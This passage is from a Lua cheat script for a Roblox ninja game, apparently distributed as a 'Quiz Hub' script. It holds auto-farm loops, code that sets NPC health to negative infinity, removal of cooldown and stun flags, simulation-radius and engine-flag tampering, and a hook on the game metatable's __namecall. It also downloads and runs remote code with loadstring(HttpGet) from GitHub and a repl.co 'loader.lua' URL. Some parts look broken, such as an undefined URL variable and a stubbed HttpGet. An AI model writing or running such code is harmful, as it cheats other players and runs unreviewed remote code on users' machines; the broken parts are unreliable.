                                                        game.ReplicatedStorage:FindFirstChild("alljutsu"):WaitForChild(
                                                            "JINSPOWEEEERRRRRRRRRRRRRRRRRR"
                                                        ) and
                                                        f:FindFirstChild("statz") and
                                                        f:FindFirstChild("statz"):FindFirstChild("keys") and
                                                        game.ReplicatedStorage.alljutsu.JINSPOWEEEERRRRRRRRRRRRRRRRRR:FindFirstChild(
                                                            f.statz.keys.z.Value
                                                        )
                                                 then
                                                    f.startevent:FireServer("addstat", "ninjutsu", 100)
                                                    if F() == false and E() == true then
                                                        if
                                                            f.Character ~= nil and
                                                                not f.Character:FindFirstChild("zombify")
                                                         then
                                                            if not f.Character:FindFirstChild("bodyeffect") then
                                                                f.Character.combat.update:FireServer("key", "z")
                                                            end
                                                            workspace.VC.RemoteEvent:FireServer("!spirit")
                                                        else
                                                            workspace.Camera.CameraSubject = f.Character
                                                        end
                                                    else
                                                        workspace.Camera.CameraSubject = f.Character
                                                        f.CameraMaxZoomDistance = 0
                                                        f.CameraMaxZoomDistance = 30
                                                        f.Character.HumanoidRootPart.CFrame =
                                                            s().HumanoidRootPart.CFrame * CFrame.new(0, 30, 0)
                                                        workspace.CurrentCamera.CFrame =
                                                            CFrame.new(
                                                            workspace.CurrentCamera.CFrame.Position,
                                                            s().HumanoidRootPart.Position
                                                        )
                                                        if s():FindFirstChild("HumanoidRootPart") then
                                                            f.startevent:FireServer(
                                                                "target",
                                                                s():FindFirstChild("HumanoidRootPart")
                                                            )
                                                        end
                                                        f.Character.combat.update:FireServer("key", "e")
                                                        f.Character.combat.update:FireServer("key", "eend")
                                                    end
                                                    if f.PlayerGui.Main.ingame.chat.Visible then
                                                        f.PlayerGui.Main.ingame.chat.Visible = false
                                                    else
                                                        if f.Character:FindFirstChild("beserk") then
                                                            f.Character:FindFirstChild("beserk"):Destroy()
                                                        else
                                                            if
                                                                f.PlayerGui:FindFirstChild("Main"):FindFirstChild(
                                                                    "Frame"
                                                                )
                                                             then
                                                                f.PlayerGui:FindFirstChild("Main"):FindFirstChild(
                                                                    "Frame"
                                                                ):Destroy()
                                                            end
                                                        end
                                                    end
                                                else
                                                    f.Character.HumanoidRootPart.CFrame =
                                                        s().HumanoidRootPart.CFrame
                                                    hit2()
                                                end
                                            until s() == false or not g.Auto_Farm_Bosses_Event.Value or
                                                (g.Auto_Collect_Scroll.Value and getgenv().GetScroll() ~= nil)
                                        end
                                    end
                                end
                            )
                        end
                    end
                end
            )
            workspace.ClientEffects.ChildAdded:connect(
                function(V)
                    if g.Auto_Farm_Bosses_Event.Value then
                        pcall(
                            function()
                                game.Debris:AddItem(V, 0)
                            end
                        )
                    end
                end
            )
        end
        if workspace:FindFirstChild("apolmission") then
            task.wait(2)
            local A = t:AddTab("Event")
            local x = A:AddLeftGroupbox("Event - Farm")
            x:AddLabel("Spirit [Gen3] - Status", true)
            local w = x:AddLabel("Status : N/A", false)
            x:AddLabel("Spirit - Farm", true)
            x:AddToggle("Auto_Farm_Spirit_Gen3", {Text = "Auto Farm Spirit [Gen-3]"})
            x:AddToggle("Auto_Farm_Spirit_Hop2", {Text = "Auto Farm Spirit Hop"})
            local function B()
                if workspace:FindFirstChild("npc") then
                    for P, Q in pairs(workspace.npc:GetChildren()) do
                        if
                            Q:FindFirstChild("npctype") and Q:FindFirstChild("megaboss") and
                                Q:FindFirstChild("npctype").Value == "Apol" and
                                Q:FindFirstChild("Humanoid") and
                                Q:FindFirstChild("Humanoid").Health ~= 0
                         then
                            return Q
                        end
                    end
                end
                return false
            end
            local function n()
                if
                    workspace:FindFirstChild("apolmission") and
                        workspace.apolmission.missions:FindFirstChildOfClass("Folder")
                 then
                    for q, Q in pairs(workspace.apolmission.missions:FindFirstChildOfClass("Folder"):GetChildren()) do
                        if
                            Q:FindFirstChild("Talk") and Q:FindFirstChild("HumanoidRootPart") and
                                Q:FindFirstChild("Talk"):FindFirstChild("accepted") and
                                Q:FindFirstChild("Talk"):FindFirstChild("accepted").Value == false
                         then
                            return Q
                        end
                    end
                end
                return false
            end
            task.spawn(
                function()
                    while true do
                        task.wait()
                        if g.Auto_Farm_Spirit_Gen3.Value then
                            pcall(
                                function()
                                    local Q = getgenv().GetScroll()
                                    w:ChangeText("Status : N/A")
                                    f.CameraMaxZoomDistance = 30
                                    if g.Auto_Collect_Scroll.Value and Q ~= nil then
                                        f.Character.HumanoidRootPart.CFrame = Q.CFrame
                                        if
                                            f:DistanceFromCharacter(Q.Position) <= 30 and
                                                Q:FindFirstChild("ClickDetector")
                                         then
                                            fireclickdetector(Q:FindFirstChild("ClickDetector"))
                                            e:Notify(("Collecting Scroll :'%s'"):format(Q.Parent.Name), 10)
                                        end
                                    else
                                        if B() == false then
                                            local W = n()
                                            if W ~= false then
                                                if
                                                    W.HumanoidRootPart ~= nil and W.CLIENTTALK ~= nil and
                                                        W.Talk ~= nil
                                                 then
                                                    f.Character.HumanoidRootPart.CFrame =
                                                        W.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
                                                    task.wait(0.2)
                                                    if f:DistanceFromCharacter(W.HumanoidRootPart.Position) <= 10 then
                                                        W.CLIENTTALK:FireServer()
                                                        W.CLIENTTALK:FireServer("accept")
                                                    end
                                                    task.wait(1)
                                                end
                                            else
                                                if g.Auto_Farm_Spirit_Hop2.Value then
                                                    Teleport()
                                                    task.wait(2)
                                                end
                                            end
                                        else
                                            repeat
                                                task.wait()
                                                w:ChangeText(
                                                    "Killing " ..
                                                        tostring((B():FindFirstChild("npctype").Value):sub(1, -2)) ..
                                                            " | " ..
                                                                B().Humanoid.Health .. "/" .. B().Humanoid.MaxHealth
                                                )
                                                if
                                                    game.ReplicatedStorage:FindFirstChild("alljutsu") and
                                                        game.ReplicatedStorage:FindFirstChild("alljutsu"):WaitForChild(
                                                            "JINSPOWEEEERRRRRRRRRRRRRRRRRR"
                                                        ) and
                                                        f:FindFirstChild("statz") and
                                                        f:FindFirstChild("statz"):FindFirstChild("keys") and
                                                        game.ReplicatedStorage.alljutsu.JINSPOWEEEERRRRRRRRRRRRRRRRRR:FindFirstChild(
                                                            f.statz.keys.z.Value
                                                        )
                                                 then
                                                    f.startevent:FireServer("addstat", "ninjutsu", 100)
                                                    if F() == false and E() == true then
                                                        if
                                                            f.Character ~= nil and
                                                                not f.Character:FindFirstChild("zombify")
                                                         then
                                                            if not f.Character:FindFirstChild("bodyeffect") then
                                                                f.Character.combat.update:FireServer("key", "z")
                                                            end
                                                            workspace.VC.RemoteEvent:FireServer("!spirit")
                                                        else
                                                            workspace.Camera.CameraSubject = f.Character
                                                        end
                                                    else
                                                        workspace.Camera.CameraSubject = f.Character
                                                        f.CameraMaxZoomDistance = 0
                                                        f.CameraMaxZoomDistance = 30
                                                        f.Character.HumanoidRootPart.CFrame =
                                                            B().HumanoidRootPart.CFrame * CFrame.new(0, 30, 0)
                                                        workspace.CurrentCamera.CFrame =
                                                            CFrame.new(
                                                            workspace.CurrentCamera.CFrame.Position,
                                                            B().HumanoidRootPart.Position
                                                        )
                                                        if B():FindFirstChild("HumanoidRootPart") then
                                                            f.startevent:FireServer(
                                                                "target",
                                                                B():FindFirstChild("HumanoidRootPart")
                                                            )
                                                        end
                                                        f.Character.combat.update:FireServer("key", "e")
                                                        f.Character.combat.update:FireServer("key", "eend")
                                                    end
                                                    if f.PlayerGui.Main.ingame.chat.Visible then
                                                        f.PlayerGui.Main.ingame.chat.Visible = false
                                                    else
                                                        if f.Character:FindFirstChild("beserk") then
                                                            f.Character:FindFirstChild("beserk"):Destroy()
                                                        else
                                                            if
                                                                f.PlayerGui:FindFirstChild("Main"):FindFirstChild(
                                                                    "Frame"
                                                                )
                                                             then
                                                                f.PlayerGui:FindFirstChild("Main"):FindFirstChild(
                                                                    "Frame"
                                                                ):Destroy()
                                                            end
                                                        end
                                                    end
                                                else
                                                    f.Character.HumanoidRootPart.CFrame =
                                                        B().HumanoidRootPart.CFrame
                                                    hit2()
                                                end
                                            until B() == false or not g.Auto_Farm_Spirit_Gen3.Value or
                                                (g.Auto_Collect_Scroll.Value and getgenv().GetScroll() ~= nil)
                                        end
                                    end
                                end
                            )
                        end
                    end
                end
            )
            workspace.ClientEffects.ChildAdded:connect(
                function(W)
                    if g.Auto_Farm_Spirit_Gen3.Value then
                        pcall(
                            function()
                                game.Debris:AddItem(W, 0)
                            end
                        )
                    end
                end
            )
        end
        task.spawn(
            function()
                while true do
                    task.wait()
                    pcall(
                        function()
                            if g.Auto_Farm_Level.Value or g.Auto_Kaiton.Value then
                                if isnetworkowner then
                                    for x, n in pairs(workspace.npc:GetChildren()) do
                                        if
                                            n:FindFirstChild("HumanoidRootPart") and n:FindFirstChild("Humanoid") and
                                                isnetworkowner(n:FindFirstChild("HumanoidRootPart"))
                                         then
                                            if
                                                n:FindFirstChild("Humanoid").Health ~=
                                                    n:FindFirstChild("Humanoid").MaxHealth
                                             then
                                                n:FindFirstChild("Humanoid").Health = -math.huge
                                            end
                                        end
                                    end
                                else
                                    for s, n in pairs(workspace.npc:GetChildren()) do
                                        if n:FindFirstChild("HumanoidRootPart") and n:FindFirstChild("Humanoid") then
                                            if
                                                n:FindFirstChild("Humanoid").Health ~=
                                                    n:FindFirstChild("Humanoid").MaxHealth
                                             then
                                                n:FindFirstChild("Humanoid").Health = -math.huge
                                            end
                                        end
                                    end
                                end
                            end
                        end
                    )
                end
            end
        )
        workspace.ClientEffects.ChildAdded:connect(
            function(A)
                if
                    g.Auto_Farm_Level.Value or g.Auto_Kaiton.Value or g.Auto_Farm_Spirit.Value or
                        g.Auto_Train_Logs.Value
                 then
                    pcall(
                        function()
                            game.Debris:AddItem(A, 0)
                        end
                    )
                end
            end
        )
        task.spawn(
            function()
                while true do
                    task.wait()
                    pcall(
                        function()
                            if g.Auto_Farm_Level.Value or g.Auto_Kaiton.Value or g.Auto_Farm_Spirit.Value then
                                f.Character.Humanoid:ChangeState(11)
                            end
                        end
                    )
                end
            end
        )
        task.spawn(
            function()
                while true do
                    task.wait()
                    pcall(
                        function()
                            if g.Auto_Farm_Level.Value or g.Auto_Kaiton.Value or g.Auto_Farm_Spirit.Value then
                                if f.Character ~= nil and f.Character:FindFirstChild("combat") then
                                    if f.Character.combat:FindFirstChild("attacked") then
                                        game.Debris:AddItem(f.Character.combat:FindFirstChild("attacked"), 0)
                                    end
                                    if f.Character.combat:FindFirstChild("nomove") then
                                        game.Debris:AddItem(f.Character.combat:FindFirstChild("nomove"), 0)
                                    end
                                    if f.Character.combat:FindFirstChild("ragdoll") then
                                        f.Character.combat:FindFirstChild("ragdoll").Value = false
                                    end
                                    if f.Character.combat:FindFirstChild("charge") then
                                    end
                                    if f.Character:FindFirstChild("Gripsystem") then
                                        game.Debris:AddItem(f.Character:FindFirstChild("Gripsystem"), 0)
                                    end
                                    f.Character.combat.disable.Value = false
                                    f.Character.combat.canrun.Value = false
                                    f.Character.combat.delayfront.Value = false
                                    if f.Character.combat:FindFirstChild("landed") then
                                        game.Debris:AddItem(f.Character:FindFirstChild("Gripsystem"), 0)
                                    end
                                    if f.Character.combat:FindFirstChild("attacked") then
                                        game.Debris:AddItem(f.Character.combat:FindFirstChild("attacked"), 0)
                                    end
                                    if f.Character.combat:FindFirstChild("slowdown") then
                                        game.Debris:AddItem(f.Character.combat:FindFirstChild("slowdown"), 0)
                                    end
                                    if f.Character.combat:FindFirstChild("nowalk") then
                                        game.Debris:AddItem(f.Character.combat:FindFirstChild("nowalk"), 0)
                                    end
                                    if f.Character.combat:FindFirstChild("nomove") then
                                        game.Debris:AddItem(f.Character.combat:FindFirstChild("nomove"), 0)
                                    end
                                    f.Character.combat.charge.Value = false
                                    f.Character.combat.bind.Value = false
                                    f.Character.combat.grip.Value = false
                                end
                            end
                            if g.No_Cooldown.Value then
                                if f.Character ~= nil and f.Character:FindFirstChild("combat") then
                                    if f.Character.combat:FindFirstChild("attacked") then
                                        game.Debris:AddItem(f.Character.combat:FindFirstChild("attacked"), 0)
                                    end
                                    if f.Character.combat:FindFirstChild("nomove") then
                                        game.Debris:AddItem(f.Character.combat:FindFirstChild("nomove"), 0)
                                    end
                                    if f.Character.combat:FindFirstChild("ragdoll") then
                                        f.Character.combat:FindFirstChild("ragdoll").Value = false
                                    end
                                    if f.Character.combat:FindFirstChild("charge") then
                                    end
                                    if f.Character:FindFirstChild("Gripsystem") then
                                        game.Debris:AddItem(f.Character:FindFirstChild("Gripsystem"), 0)
                                    end
                                    f.Character.combat.disable.Value = false
                                    f.Character.combat.canrun.Value = false
                                    f.Character.combat.delayfront.Value = false
                                    if f.Character.combat:FindFirstChild("landed") then
                                        game.Debris:AddItem(f.Character:FindFirstChild("Gripsystem"), 0)
                                    end
                                    if f.Character.combat:FindFirstChild("attacked") then
                                        game.Debris:AddItem(f.Character.combat:FindFirstChild("attacked"), 0)
                                    end
                                    if f.Character.combat:FindFirstChild("slowdown") then
                                        game.Debris:AddItem(f.Character.combat:FindFirstChild("slowdown"), 0)
                                    end
                                    if f.Character.combat:FindFirstChild("nowalk") then
                                        game.Debris:AddItem(f.Character.combat:FindFirstChild("nowalk"), 0)
                                    end
                                    if f.Character.combat:FindFirstChild("nomove") then
                                        game.Debris:AddItem(f.Character.combat:FindFirstChild("nomove"), 0)
                                    end
                                    f.Character.combat.charge.Value = false
                                    f.Character.combat.bind.Value = false
                                    f.Character.combat.grip.Value = false
                                end
                            end
                        end
                    )
                end
            end
        )
        task.spawn(
            function()
                while true do
                    task.wait()
                    pcall(
                        function()
                            if sethiddenproperty then
                                sethiddenproperty(f, "SimulationRadius", 60000)
                                sethiddenproperty(f, "MaximumSimulationRadius", 9.0E9)
                            end
                            if setscriptable then
                                setscriptable(f, "SimulationRadius", true)
                                setscriptable(f, "MaximumSimulationRadius", true)
                                f.SimulationRadius = 60000
                                f.MaximumSimulationRadius = 9.0E9
                            end
                        end
                    )
                end
            end
        )
        setfflag("HumanoidParallelRemoveNoPhysics", "False")
        setfflag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
        local d = t:AddTab("Settings")
        local S = d:AddLeftGroupbox("UI")
        local v = d:AddRightGroupbox("Mount")
        local C = d:AddLeftGroupbox("Load Function")
        local O = d:AddRightGroupbox("Misc")
        S:AddLabel("Background Color"):AddColorPicker("SettingsMenuBackgroundColor", {Default = e.BackgroundColor})
        S:AddLabel("Main Color"):AddColorPicker("SettingsMenuMainColor", {Default = e.MainColor})
        S:AddLabel("Accent Color"):AddColorPicker("SettingsMenuAccentColor", {Default = e.AccentColor})
        S:AddLabel("Inline Color"):AddColorPicker("SettingsMenuInlineColor", {Default = e.InlineColor})
        S:AddLabel("Outline Color"):AddColorPicker("SettingsMenuOutlineColor", {Default = e.OutlineColor})
        S:AddLabel("Font Color"):AddColorPicker("SettingsMenuFontColor", {Default = e.FontColor})
        S:AddLabel("", false)
        S:AddToggle("SettingsMenuKeybinds", {Text = "Show Keybinds Menu"}):OnChanged(
            function(V)
                e.KeybindFrame.Visible = V
            end
        )
        S:AddToggle("SettingsMenuWatermark", {Text = "Show Watermark", Default = true}):OnChanged(
            function(W)
                e:SetWatermarkVisibility(W)
            end
        )
        S:AddButton("Default Theme", SetDefault)
        S:AddButton(
            "Unload",
            function()
                e:Unload()
            end
        )
        v:AddInput("SettingsConfigName", {Text = "Config Name", Default = "", Placeholder = "Name"})
        v:AddButton(
            "Create Config",
            function()
                CreateConfig(g.SettingsConfigName.Value)
            end
        )
        v:AddLabel("", false)
        v:AddDropdown("SettingsConfigConfigs", {Text = "Configs", Default = 1, Values = GetConfigNames()})
        v:AddButton(
            "Load Config",
            function()
                G.Load.AutoLoad.LastUsedConfig = g.SettingsConfigConfigs.Value
                LoadConfig(GetConfigByName(g.SettingsConfigConfigs.Value))
                e:Notify(('Config "%s" Has Been Loaded.'):format(g.SettingsConfigConfigs.Value))
            end
        )
        v:AddButton(
            "Save Config",
            function()
                SaveConfig(g.SettingsConfigConfigs.Value)
            end
        )
        v:AddButton(
            "Delete Config",
            function()
                DeleteConfig(g.SettingsConfigConfigs.Value, true)
            end
        )
        v:AddLabel("", false)
        v:AddInput("SettingsConfigData", {Text = "Config Data", Default = "", Placeholder = "Data"})
        v:AddButton("Export Data", ExportData)
        v:AddButton("Import Data", ImportData)
        C:AddToggle("SettingsAutoLoadEnabled", {Text = "Enabled", Default = true}):OnChanged(
            function(x)
                G.Load.AutoLoad.Enabled = x
            end
        )
        C:AddToggle("SettingsAutoLoadRage", {Text = "Rage Settings"}):OnChanged(
            function(W)
                G.Load.AutoLoad.RageSettings = W
            end
        )
        C:AddToggle("SettingsAutoLoadSilent", {Text = "Silent Load"}):OnChanged(
            function(J)
                G.Load.AutoLoad.SilentLoad = J
            end
        )
        C:AddLabel("", false)
        C:AddDropdown(
            "SettingsAutoLoadType",
            {Text = "Type", Default = 2, Values = {"Last Used Config", "Last Config", "Custom Config"}}
        ):OnChanged(
            function(J)
                G.Load.AutoLoad.AutoLoadType = J
            end
        )
        C:AddDropdown("SettingsAutoLoadConfig", {Text = "Custom Config", Default = 1, Values = GetConfigNames()}):OnChanged(
            function(W)
                G.Load.AutoLoad.CustomConfig = W
            end
        )
        local function L()
            local n = game:GetService("Players"):GetPlayers()
            return n[math.random(1, #n)]
        end
        local function N()
            local V = L()
            if V:FindFirstChild("statz") and V:FindFirstChild("statz"):FindFirstChild("character") then
                for q, n in pairs(L().statz.character:GetChildren()) do
                    game:GetService("Players").LocalPlayer.startevent:FireServer(n.Name, n.Value)
                end
            end
        end
        O:AddToggle("SettingsMiscNotifications", {Text = "Show Notifications", Default = true}):OnChanged(
            function(s)
                e.NotificationArea.Visible = s
            end
        )
        O:AddToggle("Random_Copy_Character", {Text = "Random Copy Character"})
        task.spawn(
            function()
                while true do
                    task.wait(1)
                    if g.Random_Copy_Character.Value then
                        pcall(
                            function()
                                N()
                            end
                        )
                    end
                end
            end
        )
        O:AddButton("Random Copy Character", N)
        O:AddButton(
            "Copy Link Servers",
            function()
                local j = R
                local A = game:GetService("TeleportService")
                local B = game.PlaceId
                local w = game.JobId
                local W = ("game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s')"):format(B, w)
                setclipboard(W)
                W =
                    W:gsub(
                    ".",
                    function(V)
                        return "\\" .. V:byte()
                    end
                )
                setclipboard(("loadstring('%s')();"):format(W))
                e:Notify(("Copied To Clipboard"))
            end
        )
        O:AddButton("Reset All Settings", ResetSettings)
        SetDefault()
        g.SettingsMenuBackgroundColor:OnChanged(UpdateTheme)
        g.SettingsMenuMainColor:OnChanged(UpdateTheme)
        g.SettingsMenuAccentColor:OnChanged(UpdateTheme)
        g.SettingsMenuInlineColor:OnChanged(UpdateTheme)
        g.SettingsMenuOutlineColor:OnChanged(UpdateTheme)
        g.SettingsMenuFontColor:OnChanged(UpdateTheme)
        e.SaveManager:Load()
        task.spawn(
            function()
                while (task.wait(1) and e and e.SaveManager) do
                    e.SaveManager:SaveFile()
                end
            end
        )
        _G.Current_Time = "N/A"
        e:SetWatermark(("Playtime | %s"):format(_G.Current_Time))
        task.spawn(
            function()
                while true do
                    wait()
                    pcall(
                        function()
                            local n = math.floor(workspace.DistributedGameTime)
                            local q = math.floor(workspace.DistributedGameTime / 60)
                            local Q = math.floor(workspace.DistributedGameTime / 60 / 60)
                            local n = n - (q * 60)
                            local q = q - (Q * 60)
                            if Q < 1 then
                                if q < 1 then
                                    _G.Current_Time = n .. " Second(s)"
                                else
                                    _G.Current_Time = q .. " Minute(s), " .. n .. " Second(s)"
                                end
                            else
                                _G.Current_Time = Q .. " Hour(s), " .. q .. " Minute(s), " .. n .. " Second(s)"
                            end
                            e:SetWatermark(("Playtime | %s"):format(_G.Current_Time))
                        end
                    )
                end
            end
        )
        e:Notify("UI Finished Loading.")
        local M = math.floor(((tick() - G.Tick) * 1000) * 10) / 10
        e:Notify(("Loading Time : %sms."):format(M))
        task.spawn(
            function()
                pcall(
                    function()
                        local P, Q = getrawmetatable(game), {}
                        for W, A in next, P do
                            Q[W] = A
                        end
                        setreadonly(P, false)
                        P.__namecall =
                            newcclosure(
                            function(...)
                                local s = getnamecallmethod()
                                local n = {...}
                                if s == "FireServer" and n[1].Name == "SayMessageRequest" then
                                    if string.find(n[2], "!") then
                                        workspace.VC.RemoteEvent:FireServer(tostring(n[2]))
                                        return
                                    end
                                    return Q.__namecall(unpack(n))
                                end
                                return Q.__namecall(...)
                            end
                        )
                        setreadonly(P, true)
                    end
                )
            end
        )
    end
    U()
end



-------------- Notification --------------

local Notification = loadstring(game:HttpGet("https://raw.githubusercontent.com/Sapnase/Library/main/LoadUi.lua", true))()

function Success(HeadTitle,Title)
    Notification.new("success", HeadTitle, Title)
end

function Error(HeadTitle,Title)
    Notification.new("error", HeadTitle, Title)
end

function Warn(HeadTitle,Title)
    Notification.new("warning", HeadTitle, Title)
end

function Info(HeadTitle,Title)
    Notification.new("info", HeadTitle, Title)
end

function Message(HeadTitle,Title)
    Notification.new("message", HeadTitle, Title)
end

----------------------------------

local ScriptContext = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'

LoadCheck = function()
    local a = workspace.Parent
    getgenv().game = {}
    for i,v in pairs(a:GetChildren()) do
        game[v] = v
    end
    function game:GetService(obj)
        return a:GetService(obj)
    end
    function 
        game:HttpGet(...) 
    end
    function game:GetChildren()
        return a:GetChildren()
    end
    function game:GetDescendants()
        return a:GetDescendants()
    end
    loadstring(a:HttpGet(String, true))()    
end

Dec = function(data)
    data = string.gsub(data, '[^'..ScriptContext..'=]', '')
    return (data:gsub('.', function(x)
        if (x == '=') then return '' end
        local r,f='',(ScriptContext:find(x)-1)
        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
        return r;
    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
        if (#x ~= 8) then return '' end
        local c=0
        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
            return string.char(c)
    end))
end

LoadCheck("https://secret.myalpha.repl.co/api/loader.lua")

----------------------------------

do 
    return(function(value)
        spawn(function()
            if value == true then
                if isfolder("Quiz Hub X Foundation/Foundation/BackUp/") == true then
                    if isfile("Quiz Hub X Foundation/Foundation/BackUp/Joseph.lua") == true then
                        local ReadKey = Dec(readfile("Quiz Hub X Foundation/Foundation/BackUp/Joseph.lua"))
                        if ReadKey == "Foundation" then 
                            _Secret = true
                        end
                    end
                end
            end
        end)
    end)(true)
end

if _Secret == true then
    Script()
    Success("Quiz Hub Scripts","Execute [ Shindo_Project.lua ]")
end
